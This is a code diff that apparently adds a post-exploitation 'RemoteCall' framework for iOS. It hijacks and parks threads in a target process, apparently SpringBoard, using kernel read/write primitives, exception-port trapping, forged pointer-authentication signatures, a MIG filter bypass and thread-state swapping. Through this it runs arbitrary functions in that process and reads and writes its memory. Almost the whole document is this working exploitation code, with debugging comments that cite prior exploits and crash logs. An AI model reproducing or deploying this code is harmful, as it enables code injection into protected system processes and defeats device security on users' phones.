+    while (wait_exception(firstExceptionPort, &exc2, desiredTimeout, false)) {
+        drainHits++;
+        RC_DIAG("pre-creator drain hit#%d PC=0x%llx LR=0x%llx",
+                drainHits,
+                (unsigned long long)native_strip(exc2.threadState.__pc),
+                (unsigned long long)native_strip(exc2.threadState.__lr));
+        reply_with_state(&exc2, &exc2.threadState);
+    }
+    RC_DIAG("pre-creator drain done hits=%d", drainHits);
+
+    if (!g_RC_trojanThreadAddr)
+        g_RC_trojanThreadAddr = firstThread;
+
+    arm_thread_state64_internal newState = exc.threadState;
+    sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
+    RC_DIAG("creator-park signer=0x%llx signedPC=0x%llx signedLR=0x%llx flags=0x%x",
+            (unsigned long long)g_RC_trojanThreadAddr,
+            (unsigned long long)newState.__pc,
+            (unsigned long long)newState.__lr,
+            (unsigned)newState.__flags);
+    reply_with_state(&exc, &newState);
+    RC_DIAG("creator replied — next getpid must consume PC=0x101");
+
+    // Cyanide TaskRop/RemoteCall.m: after creator reply there is NO wait/repark.
+    // The 1500ms loop above is the PRE-creator drain (same as Cyanide). Post-reply
+    // wait+repark (e2ef173) → SB WATCHDOG at PC=0x101; wait+reply-same (43e15a4)
+    // → SIGBUS PC=0x201. Next do_remote_call_temp("getpid") must consume the
+    // 0x101 trap directly. Fail paths use fail_after_creator_park (restore).
+
+    if (g_RC_originalThreadOnly) {
+        g_RC_creatingExtraThread = false;
+        g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
+        g_RC_pid = (int)targetPid;
+        g_RC_success = true;
+        RC_DEBUG("[%s:%d] Original-thread-only RemoteCall ready; skipping synthetic pthread\n",
+             __FUNCTION__, __LINE__);
+        return 0;
+    }
+
+    // Fl0rk @ 0x100e61ff8..004 / 0x100e60544..0x100e64dc4:
+    //   out = (SP & 0x7fffffffff) - 0x100
+    //   signed = remote_pac(trojan, 0x301, 0)
+    //   pthread_create_suspended_np(out, 0, signed, 0)
+    // 34c8d33 still *out=0 after dropping entry cache. Prior malloc out also
+    // remapped OUR writes but not create's. Split the fault:
+    //   canary DEAD via remote_write, then SB-side memcpy bounce to heap
+    //   (heap remap known-good) so we see what SB's MMU sees at out.
+    uint64_t trapSP = (uint64_t)exc.threadState.__sp & 0x7fffffffffULL;
+    uint64_t trojanMemTemp = trapSP - 0x100ULL;
+    g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
+    g_RC_success = true;
+    RC_DIAG("Fl0rk out=SP-0x100: SP=0x%llx out=0x%llx vmMap=0x%llx",
+            (unsigned long long)trapSP,
+            (unsigned long long)trojanMemTemp,
+            (unsigned long long)g_RC_vmMap);
+
+    uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
+    RC_DIAG("remote_pac(0x301,0)=0x%llx", (unsigned long long)remoteCrashSigned);
+
+    RC_DIAG("bootstrap getpid begin");
+    uint64_t bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
+    RC_DIAG("bootstrap getpid done pid=%llu success=%d",
+            (unsigned long long)bootstrapPid, (int)g_RC_success);
+    if (!g_RC_success || bootstrapPid == 0) {
+        RC_DIAG("bootstrap getpid FAILED");
+        fail_after_creator_park(RemoteCallInitFailureBootstrapGetpid, targetPid);
+        return -1;
+    }
+
+    // IPS 17.5.1: pthread_create(start=unsigned sleep) -> new SB thread hits
+    // sleep@libsystem_c with PAC fail -> CODESIGNING Invalid Page / SIGKILL.
+    // 480f679/54b6d33 used that only because pthread_* are stubs on iOS 26.
+    // On pre-26, suspended_np + stripped shared-cache getpid works (756f983);
+    // thread stays suspended until we park 0x301 and resume.
+    // On iOS 26+, skip create+sleep (PAC bomb if not actually stub) and reuse
+    // inject thread[1] / originalThreadOnly.
+    const uint64_t kCanary = 0xDEADBEEFCAFEBABEULL;
+    const bool ios26StubPthread = SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"26.0");
+    uint64_t callThreadPort = 0;
+    bool createdSuspended = false;
+
+    if (!ios26StubPthread) {
+        // Park the synthetic thread by making FAKE_PC the *start routine*, the
+        // way Cyanide and Fl0rk do it. The thread is created suspended, so the
+        // kernel itself records PC=0x301 as creation-time state; the first thing
+        // the thread does after thread_resume is fault at 0x301, which lands in
+        // secondExceptionPort. Nothing written afterwards can perturb that.
+        //
+        // The fork instead used startRoutine = signed local getpid and then
+        // overwrote the state with thread_set_state(). That park never took:
+        // SB IPS 2026-09-26 06:21:04 shows thread_set_state returning kr=0 while
+        // the resumed thread still ran getpid with sp=0 — neither the 0x301 PC
+        // nor the borrowed SP landed, and the call thread then answered with an
+        // all-zero state that we used to reply onto (SIGKILL, CODESIGNING
+        // "Invalid Page"). Parking in creation-time state removes every
+        // unproven step: the remote_write into SB heap, the malloc/free of the
+        // state buffer, and the ARM_THREAD_STATE64 count semantics.
+        uint64_t startRoutine = remoteCrashSigned;
+        const char *startKind = "pac_0x301";
+        if (!startRoutine || startRoutine == (uint64_t)-1) {
+            RC_DIAG("remote_pac(FAKE_PC_TROJAN) failed — cannot create call thread");
+            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
+            return -1;
+        }
+
+        NSArray<NSNumber *> *threadsBefore = collect_all_task_threads(g_RC_taskAddr);
+
+        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=SP-0x100=0x%llx (immediate)",
+                startKind, (unsigned long long)startRoutine,
+                (unsigned long long)trojanMemTemp);
+
+        uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
+                                                    trojanMemTemp, 0, startRoutine, 0, 0, 0, 0, 0);
+        uint64_t pthreadAddr = 0;
+        uint64_t newThreadAddr = 0;
+        if (g_RC_success && createResult == 0) {
+            uint64_t heapBounce = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
+            if (g_RC_success && heapBounce) {
+                // Zero via SB memset — no KRW write to bounce (avoids shmem poison).
+                do_remote_call_temp(100, "memset", heapBounce, 0, 8, 0, 0, 0, 0, 0);
+                do_remote_call_temp(100, "memcpy", heapBounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
+                clear_remote_shmem_cache();
+                pthreadAddr = remote_read64(heapBounce);
+                RC_DIAG("post-pthread out=0x%llx sb_via_bounce=0x%llx",
+                        (unsigned long long)trojanMemTemp,
+                        (unsigned long long)pthreadAddr);
+                do_remote_call_temp(100, "free", heapBounce, 0, 0, 0, 0, 0, 0, 0);
+            } else {
+                clear_remote_shmem_cache();
+                pthreadAddr = remote_read64(trojanMemTemp);
+                RC_DIAG("post-pthread bounce miss — raw remapped read=0x%llx",
+                        (unsigned long long)pthreadAddr);
+            }
+
+            NSArray<NSNumber *> *threadsAfter = collect_all_task_threads(g_RC_taskAddr);
+            for (NSNumber *n in threadsAfter) {
+                if (![threadsBefore containsObject:n]) {
+                    newThreadAddr = n.unsignedLongLongValue;
+                    break;
+                }
+            }
+            if (newThreadAddr && is_kaddr_valid(newThreadAddr)) {
+                RC_DIAG("found synthetic thread kaddr=0x%llx (before=%lu after=%lu)",
+                        (unsigned long long)newThreadAddr,
+                        (unsigned long)threadsBefore.count,
+                        (unsigned long)threadsAfter.count);
+            }
+        } else {
+            RC_DIAG("pthread_create_suspended_np failed result=%llu success=%d — thread[1]",
+                    (unsigned long long)createResult, (int)g_RC_success);
+        }
+
+        if (newThreadAddr && is_kaddr_valid(newThreadAddr)) {
+            callThreadPort = task_find_port_for_thread(g_RC_taskAddr, newThreadAddr);
+            RC_DIAG("synthetic thread 0x%llx port in SB space = 0x%llx",
+                    (unsigned long long)newThreadAddr, (unsigned long long)callThreadPort);
+            if (callThreadPort) {
+                g_RC_callThreadAddr = newThreadAddr;
+                createdSuspended = true;
+            }
+        } else if (pthreadAddr && pthreadAddr != kCanary) {
+            callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
+            RC_DEBUG("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
+            if (g_RC_success && callThreadPort) {
+                g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
+                if (is_kaddr_valid(g_RC_callThreadAddr)) {
+                    createdSuspended = true;
+                } else {
+                    RC_DIAG("synthetic kobject invalid — thread[1]");
+                    callThreadPort = 0;
+                }
+            } else {
+                callThreadPort = 0;
+            }
+        } else {
+            RC_DIAG("create miss (bounce=0x%llx) — falling through to thread[1] reuse",
+                    (unsigned long long)pthreadAddr);
+        }
+    } else {
+        RC_DIAG("iOS26+ pthread stubs — skipping create; trying thread[1] reuse");
+    }
+
+    // Prefer a real suspended create when we have a SB-side pthread port.
+    // Otherwise reuse inject thread[1]: SB usually has NO mach port name for
+    // that kernel thread in its own ipc_space, so task_find_port_for_thread
+    // returns 0 (log: reuse failed). Falling back to originalThreadOnly parks
+    // MAIN at FAKE_LR → IPS SIGBUS PC=LR=0x201. Park via EXC_GUARD inject +
+    // reply_with_state instead (same mechanism as creator trap; no port needed).
+    bool parkedViaGuard = false;
+    if (!callThreadPort) {
+        if (g_RC_threadList.count < 2) {
+            RC_DIAG("no inject thread[1] — cannot build extra call thread");
+            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+            return -1;
+        }
+        uint64_t thread2Addr = g_RC_threadList[1].unsignedLongLongValue;
+        if (!is_kaddr_valid(thread2Addr) || thread2Addr == g_RC_trojanThreadAddr) {
+            RC_DIAG("thread[1] invalid/same-as-signer addr=0x%llx trojan=0x%llx",
+                    (unsigned long long)thread2Addr,
+                    (unsigned long long)g_RC_trojanThreadAddr);
+            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+            return -1;
+        }
+        g_RC_callThreadAddr = thread2Addr;
+        callThreadPort = task_find_port_for_thread(g_RC_taskAddr, thread2Addr);
+        RC_DIAG("thread[1] reuse addr=0x%llx port=0x%llx (0=use TRO-swap park)",
+                (unsigned long long)thread2Addr, (unsigned long long)callThreadPort);
+
+        if (callThreadPort) {
+            uint64_t suspendRet = do_remote_call_temp(100, "thread_suspend", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+            RC_DIAG("thread_suspend reused port=0x%llx ret=%llu",
+                    (unsigned long long)callThreadPort, (unsigned long long)suspendRet);
+            if (!g_RC_success || suspendRet != 0) {
+                RC_DIAG("thread_suspend failed — falling back to TRO-swap park");
+                callThreadPort = 0;
+            }
+        }
+    }
+
+    if(useMigFilterBypass)
+        mig_bypass_resume();
+
+    if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
+        printf("[%s:%d] Failed set exc port on new thread, retrying...\n", __FUNCTION__, __LINE__);
+        pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
+        g_RC_dummyThreadMach = pthread_mach_thread_np(dummyThread);
+        g_RC_dummyThreadAddr = task_get_ipc_port_kobject(selfTask, g_RC_dummyThreadMach);
+        g_RC_dummyThreadTro  = kread64(g_RC_dummyThreadAddr + off_thread_t_tro);
+        sleep(1);
+        if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
+            if(useMigFilterBypass)
+                mig_bypass_pause();
+            // Original still parked at FAKE_PC — restore before tear-down.
+            RC_DIAG("set exc port on synthetic thread failed after retry");
+            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+            return -1;
+        }
+    }
+
+    if(useMigFilterBypass)
+        mig_bypass_pause();
+
+    if (callThreadPort && createdSuspended) {
+        // Fresh suspended pthread whose creation-time PC is signed 0x301.
+        // There is deliberately no thread_set_state park here: releasing the
+        // thread IS the park. The removed block set state via remote_write into
+        // SB heap + a remote thread_set_state, and that never took --
+        // thread_set_state returned kr=0 while the resumed thread still ran the
+        // start routine with sp=0 (SB IPS 2026-09-26 06:21:04).
+        RC_DIAG("resuming synthetic call thread (creation-time PC=0x%llx)",
+                (unsigned long long)remoteCrashSigned);
+        uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+        if (ret != 0) {
+            RC_DIAG("thread_resume synthetic failed ret=%llu (no originalThreadOnly fallback)",
+                    (unsigned long long)ret);
+            fail_after_creator_park(RemoteCallInitFailureThreadResume, targetPid);
+            return -1;
+        }
+    } else {
+        // Either no SB port at all, or the port came from reusing thread[1] (iOS
+        // 26 path, where no fresh pthread was created). Neither has a
+        // creation-time PC of 0x301, so both need an explicit park via TRO-swap
+        // thread_set_state (same mechanism as set_exception_port_on_thread).
+        // Never originalThreadOnly.
+        if (callThreadPort) {
+            // The reuse path above already took a suspend on this thread via its
+            // SB port. park_remote_thread_via_tro_swap does its own balanced
+            // suspend/set_state/resume, so drop that extra suspend first --
+            // otherwise the thread stays suspended forever.
+            do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+        }
+        arm_thread_state64_internal park = {0};
+        park.__sp = g_RC_originalState.__sp;
+        park.__fp = g_RC_originalState.__fp;
+        park.__flags = g_RC_originalState.__flags;
+        sign_state(g_RC_trojanThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN);
+        RC_DIAG("TRO-swap park thread[1]=0x%llx pc=0x%llx lr=0x%llx",
+                (unsigned long long)g_RC_callThreadAddr,
+                (unsigned long long)park.__pc,
+                (unsigned long long)park.__lr);
+        RC_DIAG("TRO-swap park begin (no join; fail restores main)");
+        if (!park_remote_thread_via_tro_swap(g_RC_callThreadAddr, park.__pc, park.__lr,
+                                             useMigFilterBypass)) {
+            RC_DIAG("TRO-swap park failed — restoring main @0x201");
+            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+            return -1;
+        }
+        parkedViaGuard = true; // reused flag: parked without SB port
+        RC_DIAG("parked thread[1] at 0x301 via TRO-swap set_state (no port)");
+    }
+    (void)parkedViaGuard;
+
+    RC_DIAG("Calling restore_trojan_thread...");
+    if (!restore_trojan_thread(&g_RC_originalState)) {
+        RC_DIAG("restore original after pthread bootstrap failed");
+        // Extra thread is live; still tear down cleanly via destroy path later.
+        // Original may be stuck — best-effort already tried.
+        fail_after_creator_park(RemoteCallInitFailureRestoreOriginal, targetPid);
+        return -1;
+    }
+    RC_DIAG("Original thread restored, calling first stable getpid...");
+
+    g_RC_pid = (int)do_remote_call_stable(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
+    RC_DIAG("first stable getpid result pid=%d", g_RC_pid);
+
+    // The stable call is the first proof that the synthetic thread is really
+    // parked at 0x301 and answers on secondExceptionPort. If it did not, the
+    // session is unusable — bail instead of falling through to the unconditional
+    // `g_RC_success = true` at the end, which used to hand callers a live-looking
+    // but broken session (every later objc_msgSend then went nowhere).
+    if (!g_RC_success || !g_RC_pid) {
+        RC_DIAG("first stable getpid failed (success=%d) — tearing down session",
+                (int)g_RC_success);
+        fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+        return -1;
+    }
+
+    g_RC_trojanMem = do_remote_call_stable(1000, "mmap", 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);
+    RC_DIAG("stable mmap result=0x%llx", (unsigned long long)g_RC_trojanMem);
+
+    do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);
+    RC_DIAG("stable memset done");
+
+    g_RC_success = true;
+    RC_DEBUG("[%s:%d] Finished successfully\n", __FUNCTION__, __LINE__);
+
+    return 0;
+}
+
+int init_remote_call_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
+{
+    RemoteCallState *state = remote_call_current_state();
+    int previousTimeout = state->firstExceptionTimeoutMS;
+    state->firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : previousTimeout;
+    int result = init_remote_call(process, useMigFilterBypass);
+    state->firstExceptionTimeoutMS = previousTimeout;
+    return result;
+}
+
+int init_remote_call_original_thread_only_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
+{
+    RemoteCallState *state = remote_call_current_state();
+    bool previousOriginalThreadOnly = state->originalThreadOnly;
+    state->originalThreadOnly = true;
+    int result = init_remote_call_with_first_exception_timeout(process, useMigFilterBypass, firstExceptionTimeoutMS);
+    state->originalThreadOnly = previousOriginalThreadOnly;
+    return result;
+}
+
+@implementation RemoteCallSession {
+    RemoteCallState _state;
+}
+
+- (instancetype)initWithProcess:(NSString *)process useMigFilterBypass:(BOOL)useMigFilterBypass
+{
+    return [self initWithProcess:process
+              useMigFilterBypass:useMigFilterBypass
+         firstExceptionTimeoutMS:120000];
+}
+
+- (instancetype)initWithProcess:(NSString *)process
+              useMigFilterBypass:(BOOL)useMigFilterBypass
+         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
+{
+    return [self initWithProcess:process
+              useMigFilterBypass:useMigFilterBypass
+         firstExceptionTimeoutMS:firstExceptionTimeoutMS
+              originalThreadOnly:NO];
+}
+
+- (instancetype)initWithProcess:(NSString *)process
+              useMigFilterBypass:(BOOL)useMigFilterBypass
+         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
+              originalThreadOnly:(BOOL)originalThreadOnly
+{
+    self = [super init];
+    if (!self)
+        return nil;
+
+    memset((void *)&_state, 0, sizeof(_state));
+    _state.success = true;
+    _state.threadList = [NSMutableArray new];
+    _state.firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : 120000;
+    _state.stableExceptionTimeoutFloorMS = 10000;
+    _state.originalThreadOnly = originalThreadOnly;
+
+    const char *processName = process.UTF8String;
+    if (!processName)
+        return nil;
+
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    int result = init_remote_call(processName, useMigFilterBypass);
+    if (result != 0) {
+        abandon_remote_call();
+    }
+    remote_call_pop_state(previous);
+
+    if (result != 0)
+        return nil;
+
+    return self;
+}
+
+- (void)dealloc
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    if (remote_call_has_local_state()) {
+        destroy_remote_call();
+    }
+    remote_call_pop_state(previous);
+}
+
+- (uint64_t)taskAddr
+{
+    return _state.taskAddr;
+}
+
+- (uint64_t)trojanMem
+{
+    return _state.trojanMem;
+}
+
+- (int)pid
+{
+    return _state.pid;
+}
+
+- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
+                             functionName:(const char *)name
+                                       x0:(uint64_t)x0
+                                       x1:(uint64_t)x1
+                                       x2:(uint64_t)x2
+                                       x3:(uint64_t)x3
+                                       x4:(uint64_t)x4
+                                       x5:(uint64_t)x5
+                                       x6:(uint64_t)x6
+                                       x7:(uint64_t)x7
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    uint64_t result = do_remote_call_stable(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
+    remote_call_pop_state(previous);
+    return result;
+}
+
+- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
+                          functionAddress:(uint64_t)pcAddr
+                             functionName:(const char *)name
+                                       x0:(uint64_t)x0
+                                       x1:(uint64_t)x1
+                                       x2:(uint64_t)x2
+                                       x3:(uint64_t)x3
+                                       x4:(uint64_t)x4
+                                       x5:(uint64_t)x5
+                                       x6:(uint64_t)x6
+                                       x7:(uint64_t)x7
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    uint64_t result = do_remote_call_stable_addr(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
+    remote_call_pop_state(previous);
+    return result;
+}
+
+- (BOOL)remoteRead:(uint64_t)src to:(void *)dst size:(uint64_t)size
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    BOOL result = remote_read(src, dst, size);
+    remote_call_pop_state(previous);
+    return result;
+}
+
+- (uint64_t)remoteRead64:(uint64_t)src
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    uint64_t result = remote_read64(src);
+    remote_call_pop_state(previous);
+    return result;
+}
+
+- (BOOL)remoteWrite:(uint64_t)dst from:(const void *)src size:(uint64_t)size
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    BOOL result = remote_write(dst, src, size);
+    remote_call_pop_state(previous);
+    return result;
+}
+
+- (BOOL)remoteWrite64:(uint64_t)dst value:(uint64_t)val
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    BOOL result = remote_write64(dst, val);
+    remote_call_pop_state(previous);
+    return result;
+}
+
+- (BOOL)remoteWriteString:(uint64_t)dst value:(const char *)str
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    BOOL result = remote_writeStr(dst, str);
+    remote_call_pop_state(previous);
+    return result;
+}
+
+- (int)destroyRemoteCall
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    int result = destroy_remote_call();
+    remote_call_pop_state(previous);
+    return result;
+}
+
+- (void)abandonRemoteCall
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    abandon_remote_call();
+    remote_call_pop_state(previous);
+}
+
+- (BOOL)hasLocalState
+{
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    BOOL result = remote_call_has_local_state();
+    remote_call_pop_state(previous);
+    return result;
+}
+
+- (RemoteCallState *)remoteCallStatePointer
+{
+    return &_state;
+}
+
+- (RemotePointer *)objectAtIndexedSubscript:(NSUInteger)address
+{
+    return [[RemotePointer alloc] initWithSession:self address:address];
+}
+
+@end
+
+#define REMOTE_POINTER_DEFAULT_STRING_MAX 0x4000
+#define REMOTE_POINTER_STRING_CHUNK 0x100
+
+@implementation RemotePointer
+
+- (instancetype)initWithSession:(RemoteCallSession *)session address:(uint64_t)address
+{
+    self = [super init];
+    if (!self)
+        return nil;
+
+    _session = session;
+    _address = address;
+    return self;
+}
+
+- (BOOL)readTo:(void *)dst size:(uint64_t)size
+{
+    return [_session remoteRead:_address to:dst size:size];
+}
+
+- (BOOL)writeFrom:(const void *)src size:(uint64_t)size
+{
+    return [_session remoteWrite:_address from:src size:size];
+}
+
+- (BOOL)writeCString:(const char *)string
+{
+    return [_session remoteWriteString:_address value:string];
+}
+
+- (void)setString:(NSString *)string
+{
+    [self writeCString:string.UTF8String];
+}
+
+- (NSString *)string
+{
+    return [self stringWithMaxLength:REMOTE_POINTER_DEFAULT_STRING_MAX];
+}
+
+- (NSString *)stringWithMaxLength:(size_t)maxLength
+{
+    if (!_session || !_address || maxLength == 0)
+        return nil;
+
+    char *buf = (char *)calloc(maxLength + 1, 1);
+    if (!buf)
+        return nil;
+
+    size_t copied = 0;
+    while (copied < maxLength) {
+        size_t chunk = REMOTE_POINTER_STRING_CHUNK;
+        if (chunk > maxLength - copied)
+            chunk = maxLength - copied;
+
+        uint64_t current = _address + copied;
+        size_t pageRemaining = (size_t)(PAGE_SIZE - (current & PAGE_MASK));
+        if (chunk > pageRemaining)
+            chunk = pageRemaining;
+
+        if (![_session remoteRead:_address + copied to:buf + copied size:chunk]) {
+            free(buf);
+            return nil;
+        }
+
+        char *end = memchr(buf + copied, 0, chunk);
+        if (end) {
+            size_t length = (size_t)(end - buf);
+            NSString *result = [[NSString alloc] initWithBytes:buf length:length encoding:NSUTF8StringEncoding];
+            free(buf);
+            return result;
+        }
+
+        copied += chunk;
+    }
+
+    NSString *result = [[NSString alloc] initWithBytes:buf length:maxLength encoding:NSUTF8StringEncoding];
+    free(buf);
+    return result;
+}
+
+- (void)setValue8:(uint8_t)value
+{
+    [self writeFrom:&value size:sizeof(value)];
+}
+
+- (uint8_t)value8
+{
+    uint8_t value = 0;
+    [self readTo:&value size:sizeof(value)];
+    return value;
+}
+
+- (void)setValue16:(uint16_t)value
+{
+    [self writeFrom:&value size:sizeof(value)];
+}
+
+- (uint16_t)value16
+{
+    uint16_t value = 0;
+    [self readTo:&value size:sizeof(value)];
+    return value;
+}
+
+- (void)setValue32:(uint32_t)value
+{
+    [self writeFrom:&value size:sizeof(value)];
+}
+
+- (uint32_t)value32
+{
+    uint32_t value = 0;
+    [self readTo:&value size:sizeof(value)];
+    return value;
+}
+
+- (void)setValue64:(uint64_t)value
+{
+    [self writeFrom:&value size:sizeof(value)];
+}
+
+- (uint64_t)value64
+{
+    uint64_t value = 0;
+    [self readTo:&value size:sizeof(value)];
+    return value;
+}
+
+@end
+
+void remote_call_with_session(RemoteCallSession *session, void (^block)(void))
+{
+    if (!block)
+        return;
+
+    if (!session) {
+        block();
+        return;
+    }
+
+    RemoteCallState *state = [session remoteCallStatePointer];
+    RemoteCallState *previous = remote_call_push_state(state);
+    @try {
+        block();
+    } @finally {
+        remote_call_pop_state(previous);
+    }
+}
